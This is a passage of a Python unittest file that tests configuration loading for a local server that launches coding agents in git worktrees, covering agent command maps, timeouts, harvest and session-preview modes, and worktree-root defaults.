import calendar
import contextlib
import http.client
import io
import json
import os
import re
import shlex
import subprocess
import shutil
import sys
import tempfile
import time
import unittest
import urllib.error
import urllib.request
import xml.dom.minidom
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import harvest  # noqa: E402
import server  # noqa: E402
import version  # noqa: E402

# task-108: the frontend contract tests below assert on SOURCE TEXT, and
# used to slice their regions eagerly in setUpClass -- so a renamed
# function raised ValueError out of the fixture rather than failing the
# test that depended on it. Every region is now built through
# source_contract, which resolves on first read and fails readably,
# naming the file, the marker and the invariant. See its module
# docstring, and tests/test_frontend_behaviour.py for the behavioural
# tier that took over the invariants source text was the wrong tool for.
import js_harness  # noqa: E402
from source_contract import (  # noqa: E402
    FRONTEND_FILES,
    STATIC_DIR,
    function_body,
    load_static,
    region,
)


FIXTURES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")


def load_fixture(name):
    with open(os.path.join(FIXTURES_DIR, name), "r", encoding="utf-8") as f:
        return json.load(f)


STYLESHEET_LINK = '<link rel="stylesheet" href="/static/styles.css">'

# task-89: the frontend JS, one file per concern, in the order
# static/index.html loads them, is FRONTEND_FILES (imported above from
# source_contract, which the behaviour tier shares). Before task-89 all
# of it was a single static/app.js (task-83); the contract tests below
# each grep the file that actually holds what they assert on.
SCRIPT_TAGS = "".join(
    '<script src="/static/%s"></script>\n' % name for name in FRONTEND_FILES
)
IIFE_OPEN = '(function (C) {\n  "use strict";'
IIFE_CLOSE = "})(window.Centrale = window.Centrale || {});"
FAVICON_LINK = '<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">'


def make_config(projects):
    return {
        "port": 0,
        "worktreeRoot": "/tmp/does-not-matter",
        "projects": projects,
    }


class ConfigLoadingTests(unittest.TestCase):
    def test_defaults_when_file_missing(self):
        config = server.load_config(path="/nonexistent/projects.json")
        self.assertEqual(config["port"], 7420)
        self.assertTrue(config["worktreeRoot"])
        self.assertEqual(config["projects"], [])

    def test_zero_config_flag_true_and_at_repo_worktree_root_when_file_missing(self):
        # task-53: a missing projects.json is a genuine first run, not an
        # error -- flagged on the returned config (zeroConfig) so
        # main()/run_doctor_check() can give friendly guidance. worktreeRoot
        # defaults to '@repo' here too, but that's just the general
        # normalize_worktree_root default (see
        # test_normalize_worktree_root_defaults_to_at_repo) applying the
        # same way it would to any config omitting the key -- zeroConfig
        # itself no longer changes what default is picked.
        config = server.load_config(path="/nonexistent/projects.json")
        self.assertTrue(config["zeroConfig"])
        self.assertEqual(config["worktreeRoot"], server.WORKTREE_ROOT_REPO_TOKEN)
        self.assertEqual(config["defaultAgent"], "claude")
        self.assertEqual(config["port"], 7420)
        self.assertEqual(config["projects"], [])

    def test_zero_config_flag_false_when_file_exists(self):
        # task-57: made hermetic -- a present file (any content) must
        # never read as zero-config, regardless of what machine this
        # runs on. Previously called load_config() with no path
        # override, which reads this repo's own real, local
        # projects.json -- untracked since task-49/5cd35c2, so this
        # failed in any git-archive release snapshot, fresh clone, or CI
        # (git archive never includes untracked files) even though it
        # passed here, since the file still physically sits on this dev
        # machine. Caught by task-56's release gate on its first real run.
        tmp_path = os.path.join(FIXTURES_DIR, "_tmp_projects_zero_config_flag.json")
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": []}, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertFalse(config["zeroConfig"])

    def test_at_repo_default_also_applies_to_an_existing_file_missing_the_key(self):
        # Addendum to task-53: the '@repo' default isn't zero-config-
        # specific -- an EXISTING config file that simply omits
        # worktreeRoot now also gets '@repo', same as a missing file
        # would. The old hardcoded author-machine fallback is gone
        # entirely; anyone relying on it via an omitted key was already
        # broken on any machine but the original author's, and the
        # shipped/example configs always set worktreeRoot explicitly
        # regardless (see normalize_worktree_root's own docstring).
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_no_worktree_root.json"
        )
        raw = {"projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertFalse(config["zeroConfig"])
        self.assertEqual(config["worktreeRoot"], server.WORKTREE_ROOT_REPO_TOKEN)

    def test_malformed_existing_file_still_raises_configerror_never_reads_as_zero_config(self):
        # AC #2: zero-config covers ONLY the missing-file case -- a file
        # that exists but is malformed still fails loudly, unchanged.
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_bad_agents_zero_config.json"
        )
        raw = {"agents": {"claude": ["claude"], "bogus": {"cmd": "not-a-list"}}}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            with self.assertRaises(server.ConfigError):
                server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)

    def test_expands_tilde(self):
        # task-57 bounce: made hermetic -- previously called load_config()
        # with no path override, reading this repo's own real, local
        # projects.json. Whatever that file's own worktreeRoot/project
        # paths happened to be, this went vacuous in a release snapshot
        # or fresh clone: worktreeRoot defaults to '@repo' (no "~" to
        # find) and an empty projects list makes the per-project loop a
        # no-op, so it silently stopped exercising tilde-expansion at
        # all in those environments. A temp fixture with real tilde
        # paths in both spots makes it actually assert expansion
        # everywhere it runs.
        tmp_path = os.path.join(FIXTURES_DIR, "_tmp_projects_tilde.json")
        raw = {
            "worktreeRoot": "~/somewhere",
            "projects": [{"name": "x", "path": "~/code/x"}],
        }
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertNotIn("~", config["worktreeRoot"])
        self.assertEqual(config["worktreeRoot"], os.path.expanduser("~/somewhere"))
        for project in config["projects"]:
            self.assertNotIn("~", project["path"])
        self.assertEqual(config["projects"][0]["path"], os.path.expanduser("~/code/x"))

    def test_agents_and_browser_defaults_when_file_missing(self):
        config = server.load_config(path="/nonexistent/projects.json")
        self.assertEqual(
            config["agents"],
            {
                "claude": {"cmd": ["claude"], "promptSuffix": None, "resumeCmd": None},
                "codex": {"cmd": ["codex"], "promptSuffix": None, "resumeCmd": None},
            },
        )
        self.assertEqual(config["defaultAgent"], "claude")
        self.assertEqual(config["browserPortBase"], 6421)

    def test_agents_and_browser_defaults_when_keys_absent(self):
        # A projects.json that sets other keys but not 'agents'/
        # 'defaultAgent'/'browserPortBase' at all; defaults apply. Uses a
        # temp file rather than the real shipped projects.json, since that
        # file is user-editable config and not something this test should
        # depend on staying minimal.
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_no_agents.json"
        )
        raw = {"port": 7420, "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)

        self.assertEqual(
            config["agents"],
            {
                "claude": {"cmd": ["claude"], "promptSuffix": None, "resumeCmd": None},
                "codex": {"cmd": ["codex"], "promptSuffix": None, "resumeCmd": None},
            },
        )
        self.assertEqual(config["defaultAgent"], "claude")
        self.assertEqual(config["browserPortBase"], 6421)
        for project in config["projects"]:
            self.assertIn("browserPort", project)
            self.assertIsNone(project["browserPort"])

    def test_custom_agents_defaultAgent_browserPortBase_and_port_are_loaded(self):
        # task-57: also asserts port passthrough now -- the fixture
        # already set a non-default "port": 1234 but nothing checked it,
        # leaving "load_config reads a present port value from the file"
        # generically uncovered once the personal-data-pinning test that
        # asserted the author's own project names (the only other place
        # that asserted config["port"] against a present file) was
        # deleted for pinning real project names as an assertion.
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects.json"
        )
        raw = {
            "port": 1234,
            "agents": {"codex": ["codex", "exec"]},
            "defaultAgent": "codex",
            "browserPortBase": 9000,
            "projects": [
                {"name": "my-app", "path": "/repos/my-app", "browserPort": 9999},
                {"name": "my-tool", "path": "/repos/my-tool"},
            ],
        }
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)

        self.assertEqual(config["port"], 1234)
        self.assertEqual(config["agents"], {"codex": {"cmd": ["codex", "exec"], "promptSuffix": None, "resumeCmd": None}})
        self.assertEqual(config["defaultAgent"], "codex")
        self.assertEqual(config["browserPortBase"], 9000)
        by_name = {p["name"]: p for p in config["projects"]}
        self.assertEqual(by_name["my-app"]["browserPort"], 9999)
        self.assertIsNone(by_name["my-tool"]["browserPort"])

    def test_agents_object_form_with_promptSuffix_is_normalized(self):
        raw_map = {
            "claude": ["claude"],
            "codex": {
                "cmd": ["claude", "--append-system-prompt", "act as codex"],
                "promptSuffix": "Use the layout-reviewer subagent for review passes.",
            },
        }
        normalized = server.normalize_agents_map(raw_map)
        self.assertEqual(normalized["claude"], {"cmd": ["claude"], "promptSuffix": None, "resumeCmd": None})
        self.assertEqual(
            normalized["codex"],
            {
                "cmd": ["claude", "--append-system-prompt", "act as codex"],
                "promptSuffix": "Use the layout-reviewer subagent for review passes.",
                "resumeCmd": None,
            },
        )

    def test_agents_object_form_missing_or_blank_promptSuffix_normalizes_to_none(self):
        # Missing, or present-but-blank, promptSuffix is not malformed —
        # it just means "no suffix".
        raw_map = {
            "a": {"cmd": ["a"]},
            "b": {"cmd": ["b"], "promptSuffix": "   "},
        }
        normalized = server.normalize_agents_map(raw_map)
        for name in ("a", "b"):
            self.assertIsNone(normalized[name]["promptSuffix"], name)

    def test_agents_object_form_non_string_promptSuffix_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "c": {"cmd": ["c"], "promptSuffix": 42}})
        self.assertIn("c.promptSuffix", str(ctx.exception))

    def test_agents_object_form_resume_cmd_is_normalized(self):
        raw_map = {"claude": {"cmd": ["claude"], "resumeCmd": ["claude", "--continue"]}}
        normalized = server.normalize_agents_map(raw_map)
        self.assertEqual(normalized["claude"]["resumeCmd"], ["claude", "--continue"])

    def test_agents_object_form_missing_resume_cmd_normalizes_to_none(self):
        raw_map = {"claude": {"cmd": ["claude"]}}
        normalized = server.normalize_agents_map(raw_map)
        self.assertIsNone(normalized["claude"]["resumeCmd"])

    def test_agents_plain_list_form_has_no_resume_cmd(self):
        raw_map = {"claude": ["claude"]}
        normalized = server.normalize_agents_map(raw_map)
        self.assertIsNone(normalized["claude"]["resumeCmd"])

    def test_agents_object_form_non_list_resume_cmd_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "c": {"cmd": ["c"], "resumeCmd": "not-a-list"}})
        self.assertIn("c.resumeCmd", str(ctx.exception))

    def test_agents_object_form_empty_resume_cmd_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "c": {"cmd": ["c"], "resumeCmd": []}})
        self.assertIn("c.resumeCmd", str(ctx.exception))

    def test_agents_object_form_resume_cmd_with_non_string_items_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "c": {"cmd": ["c"], "resumeCmd": ["ok", 42]}})
        self.assertIn("c.resumeCmd", str(ctx.exception))

    def test_normalize_agents_map_with_resume_cmd_is_idempotent_on_its_own_output(self):
        raw_map = {"codex": {"cmd": ["codex"], "resumeCmd": ["codex", "resume", "--last"]}}
        once = server.normalize_agents_map(raw_map)
        twice = server.normalize_agents_map(once)
        self.assertEqual(once, twice)

    def test_agents_object_form_missing_cmd_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "bogus": {"promptSuffix": "no cmd here"}})
        self.assertIn("bogus.cmd", str(ctx.exception))

    def test_agents_cmd_not_a_list_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "bogus": {"cmd": "not-a-list"}})
        self.assertIn("bogus.cmd", str(ctx.exception))

    def test_agents_empty_cmd_list_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "bogus": {"cmd": []}})
        self.assertIn("bogus.cmd", str(ctx.exception))

    def test_agents_cmd_with_non_string_items_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "bogus": {"cmd": ["ok", 42]}})
        self.assertIn("bogus.cmd", str(ctx.exception))

    def test_agents_entry_of_wrong_top_level_type_is_rejected(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_agents_map({"claude": ["claude"], "bogus": "not-a-list-or-object"})
        self.assertIn("bogus", str(ctx.exception))

    def test_agents_map_itself_not_a_dict_is_rejected(self):
        with self.assertRaises(server.ConfigError):
            server.normalize_agents_map(["not", "a", "dict"])

    def test_missing_agents_map_is_not_an_error(self):
        # Distinct from a malformed entry: an absent/empty map just falls
        # back to defaults, it doesn't raise.
        self.assertEqual(server.normalize_agents_map(None), {})
        self.assertEqual(server.normalize_agents_map({}), {})

    def test_load_config_raises_configerror_for_malformed_agents_entry(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_bad_agents.json"
        )
        raw = {
            "agents": {"claude": ["claude"], "bogus": {"cmd": "not-a-list"}},
            "projects": [{"name": "my-app", "path": "/repos/my-app"}],
        }
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            with self.assertRaises(server.ConfigError) as ctx:
                server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertIn("bogus", str(ctx.exception))

    def test_normalize_harvest_config_defaults_to_click_when_absent(self):
        self.assertEqual(server.normalize_harvest_config(None), {"mode": "click"})

    def test_normalize_harvest_config_defaults_mode_when_dict_present_but_empty(self):
        self.assertEqual(server.normalize_harvest_config({}), {"mode": "click"})

    def test_normalize_harvest_config_accepts_click_and_auto(self):
        self.assertEqual(server.normalize_harvest_config({"mode": "click"}), {"mode": "click"})
        self.assertEqual(server.normalize_harvest_config({"mode": "auto"}), {"mode": "auto"})

    def test_normalize_harvest_config_rejects_non_dict(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_harvest_config("auto")
        self.assertIn("harvest", str(ctx.exception))

    def test_normalize_harvest_config_rejects_invalid_mode_value(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_harvest_config({"mode": "sometimes"})
        self.assertIn("harvest.mode", str(ctx.exception))

    def test_normalize_harvest_config_rejects_non_string_mode(self):
        with self.assertRaises(server.ConfigError):
            server.normalize_harvest_config({"mode": 1})

    # -- sessionPreview (task-60) -----------------------------------------

    def test_normalize_session_preview_config_defaults_to_interact_when_absent(self):
        # task-61: the full feature (pane + reply row) is on unless the
        # operator explicitly dials it down -- "easily disableable", not
        # "opt-in".
        self.assertEqual(server.normalize_session_preview_config(None), {"mode": "interact"})
        self.assertEqual(server.normalize_session_preview_config({}), {"mode": "interact"})

    def test_normalize_session_preview_config_accepts_every_tier(self):
        self.assertEqual(server.normalize_session_preview_config({"mode": "off"}), {"mode": "off"})
        self.assertEqual(server.normalize_session_preview_config({"mode": "view"}), {"mode": "view"})
        self.assertEqual(server.normalize_session_preview_config({"mode": "interact"}), {"mode": "interact"})

    def test_normalize_session_preview_config_rejects_non_dict_and_bad_mode(self):
        with self.assertRaises(server.ConfigError):
            server.normalize_session_preview_config("off")
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_session_preview_config({"mode": "sometimes"})
        self.assertIn("sessionPreview.mode", str(ctx.exception))
        with self.assertRaises(server.ConfigError):
            server.normalize_session_preview_config({"mode": False})

    def test_load_config_defaults_session_preview_to_interact_and_reads_off(self):
        # Default enabled -- an operator who never heard of the knob gets
        # the drawer pane and reply row; one who wrote {"mode": "off"}
        # gets it fully off.
        self.assertEqual(server.load_config(path="/nonexistent/projects.json")["sessionPreview"], {"mode": "interact"})
        self.assertEqual(server.session_preview_mode({}), "interact")
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_session_preview_off.json"
        )
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": [], "sessionPreview": {"mode": "off"}}, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.unlink(tmp_path)
        self.assertEqual(config["sessionPreview"], {"mode": "off"})
        self.assertEqual(server.session_preview_mode(config), "off")

    def test_load_config_defaults_harvest_mode_to_click_when_key_absent(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_no_harvest.json"
        )
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": [{"name": "my-app", "path": "/repos/my-app"}]}, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["harvest"], {"mode": "click"})

    def test_load_config_reads_explicit_harvest_mode(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_harvest_auto.json"
        )
        raw = {"harvest": {"mode": "auto"}, "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["harvest"], {"mode": "auto"})

    def test_load_config_raises_configerror_for_malformed_harvest_key(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_bad_harvest.json"
        )
        raw = {"harvest": {"mode": "sometimes"}, "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            with self.assertRaises(server.ConfigError) as ctx:
                server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertIn("harvest.mode", str(ctx.exception))

    def test_load_config_defaults_refresh_interval_when_key_absent(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_no_refresh.json"
        )
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": [{"name": "my-app", "path": "/repos/my-app"}]}, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["refreshIntervalSeconds"], server.DEFAULT_REFRESH_INTERVAL_SECONDS)

    def test_load_config_reads_explicit_refresh_interval(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_refresh_30.json"
        )
        raw = {"refreshIntervalSeconds": 30, "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["refreshIntervalSeconds"], 30)

    def test_normalize_spawn_prompt_absent_means_default(self):
        self.assertIsNone(server.normalize_spawn_prompt(None))

    def test_normalize_spawn_prompt_returns_a_valid_template_verbatim(self):
        raw = "  Work on {task_id}.\nKeep {{braces}} literal.  "
        self.assertEqual(server.normalize_spawn_prompt(raw), raw)

    def test_normalize_spawn_prompt_rejects_missing_placeholder(self):
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_spawn_prompt("Work on the task.")
        self.assertIn("spawnPrompt", str(ctx.exception))
        self.assertIn("{task_id}", str(ctx.exception))

    def test_normalize_spawn_prompt_rejects_non_string_and_blank(self):
        for bad in ("", "   ", 7, True, ["{task_id}"], {"template": "{task_id}"}):
            with self.subTest(bad=bad):
                with self.assertRaises(server.ConfigError) as ctx:
                    server.normalize_spawn_prompt(bad)
                self.assertIn("spawnPrompt", str(ctx.exception))

    def test_normalize_spawn_prompt_rejects_unknown_fields_and_broken_braces(self):
        # Anything that would KeyError/ValueError at spawn time is caught
        # at load time instead.
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_spawn_prompt("Work on {task_id} in {project}.")
        self.assertIn("project", str(ctx.exception))
        with self.assertRaises(server.ConfigError) as ctx:
            server.normalize_spawn_prompt("Work on {task_id} {")
        self.assertIn("spawnPrompt", str(ctx.exception))

    def test_load_config_reads_spawn_prompt_and_defaults_it_to_none(self):
        self.assertIsNone(server.load_config(path="/nonexistent/projects.json")["spawnPrompt"])
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_spawn_prompt.json"
        )
        raw = {"spawnPrompt": "Do {task_id}.", "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["spawnPrompt"], "Do {task_id}.")

    def test_load_config_raises_configerror_for_spawn_prompt_without_placeholder(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_bad_spawn_prompt.json"
        )
        raw = {"spawnPrompt": "Do the task.", "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            with self.assertRaises(server.ConfigError) as ctx:
                server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertIn("spawnPrompt", str(ctx.exception))

    def test_load_config_raises_configerror_for_non_integer_refresh_interval(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_bad_refresh_type.json"
        )
        raw = {"refreshIntervalSeconds": "30", "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            with self.assertRaises(server.ConfigError) as ctx:
                server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertIn("refreshIntervalSeconds", str(ctx.exception))

    def test_load_config_raises_configerror_for_refresh_interval_below_minimum(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_bad_refresh_min.json"
        )
        raw = {"refreshIntervalSeconds": 2, "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            with self.assertRaises(server.ConfigError) as ctx:
                server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertIn("refreshIntervalSeconds", str(ctx.exception))

    def test_load_config_defaults_subprocess_timeout_when_key_absent(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_no_subprocess_timeout.json"
        )
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": [{"name": "my-app", "path": "/repos/my-app"}]}, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["subprocessTimeoutSeconds"], server.DEFAULT_SUBPROCESS_TIMEOUT_SECONDS)

    def test_load_config_reads_explicit_subprocess_timeout(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_subprocess_timeout_45.json"
        )
        raw = {"subprocessTimeoutSeconds": 45, "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["subprocessTimeoutSeconds"], 45)

    def test_load_config_raises_configerror_for_non_numeric_subprocess_timeout(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_bad_subprocess_timeout.json"
        )
        raw = {"subprocessTimeoutSeconds": "soon", "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            with self.assertRaises(server.ConfigError) as ctx:
                server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertIn("subprocessTimeoutSeconds", str(ctx.exception))

    def test_load_config_raises_configerror_for_non_positive_subprocess_timeout(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_zero_subprocess_timeout.json"
        )
        raw = {"subprocessTimeoutSeconds": 0, "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            with self.assertRaises(server.ConfigError) as ctx:
                server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertIn("subprocessTimeoutSeconds", str(ctx.exception))

    def test_load_config_accepts_a_float_subprocess_timeout(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_float_subprocess_timeout.json"
        )
        raw = {"subprocessTimeoutSeconds": 12.5, "projects": [{"name": "my-app", "path": "/repos/my-app"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["subprocessTimeoutSeconds"], 12.5)

    def test_load_config_defaults_project_check_timeout_when_absent(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_no_check_timeout.json"
        )
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": [{"name": "my-app", "path": "/repos/my-app"}]}, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["projects"][0]["checkTimeoutSeconds"], server.DEFAULT_CHECK_TIMEOUT_SECONDS)

    def test_load_config_reads_explicit_project_check_timeout(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_check_timeout_120.json"
        )
        raw = {"projects": [{"name": "my-app", "path": "/repos/my-app", "checkTimeoutSeconds": 120}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["projects"][0]["checkTimeoutSeconds"], 120)

    def test_load_config_silently_falls_back_for_malformed_project_check_timeout(self):
        # Per-project fields are lenient (like browserPort/checkCommand
        # already are) -- one project's mistyped override shouldn't
        # refuse to start the whole server the way a malformed top-level
        # key does.
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_bad_check_timeout.json"
        )
        raw = {"projects": [{"name": "my-app", "path": "/repos/my-app", "checkTimeoutSeconds": "forever"}]}
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(raw, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["projects"][0]["checkTimeoutSeconds"], server.DEFAULT_CHECK_TIMEOUT_SECONDS)

    def test_normalize_worktree_root_defaults_to_at_repo(self):
        # Addendum to task-53: '@repo' is the fallback for a missing/
        # falsy value unconditionally -- the old author-machine default
        # (a hardcoded directory under the original author's home) is
        # gone. See normalize_worktree_root's own docstring for why this
        # is a deliberate, defensible behavior change rather than
        # zero-config-gated.
        self.assertEqual(server.normalize_worktree_root(None), server.WORKTREE_ROOT_REPO_TOKEN)
        self.assertEqual(server.normalize_worktree_root(""), server.WORKTREE_ROOT_REPO_TOKEN)

    def test_normalize_worktree_root_preserves_at_repo_token_unexpanded(self):
        self.assertEqual(server.normalize_worktree_root("@repo"), "@repo")

    def test_normalize_worktree_root_expands_a_plain_path(self):
        self.assertEqual(server.normalize_worktree_root("~/custom-worktrees"), os.path.expanduser("~/custom-worktrees"))
        self.assertEqual(server.normalize_worktree_root("/abs/worktrees"), "/abs/worktrees")

    def test_normalize_project_worktree_root_defaults_to_none(self):
        self.assertIsNone(server._normalize_project_worktree_root(None))
        self.assertIsNone(server._normalize_project_worktree_root(""))
        self.assertIsNone(server._normalize_project_worktree_root(123))  # malformed -- lenient, not an error

    def test_normalize_project_worktree_root_preserves_at_repo_token(self):
        self.assertEqual(server._normalize_project_worktree_root("@repo"), "@repo")

    def test_normalize_project_worktree_root_expands_a_plain_path(self):
        self.assertEqual(server._normalize_project_worktree_root("~/x"), os.path.expanduser("~/x"))

    def test_load_config_default_worktree_root_is_at_repo_for_an_omitted_key(self):
        # Addendum to task-53: renamed from
        # "...unchanged_for_plain_users" -- that used to pin the OLD
        # hardcoded author-machine default; a config that omits
        # worktreeRoot now gets '@repo' instead, deliberately (see
        # normalize_worktree_root's docstring).
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_no_worktree_root.json"
        )
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump({"projects": [{"name": "my-app", "path": "/repos/my-app"}]}, f)
        try:
            config = server.load_config(path=tmp_path)
        finally:
            os.remove(tmp_path)
        self.assertEqual(config["worktreeRoot"], server.WORKTREE_ROOT_REPO_TOKEN)
        self.assertIsNone(config["projects"][0]["worktreeRoot"])

    def test_load_config_reads_at_repo_worktree_root_global_and_per_project(self):
        tmp_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "fixtures", "_tmp_projects_at_repo.json"
        )
        raw = {
            "worktreeRoot": "@repo",
            "projects": [
                {"name": "my-app", "path": "/repos/my-app"},
                {"name": "my-lib", "path": "/repos/my-lib", "worktreeRoot": "/custom/my-lib-worktrees"},
            ],
        }
        with open(tmp_path, "w", encoding="utf-8") as f:
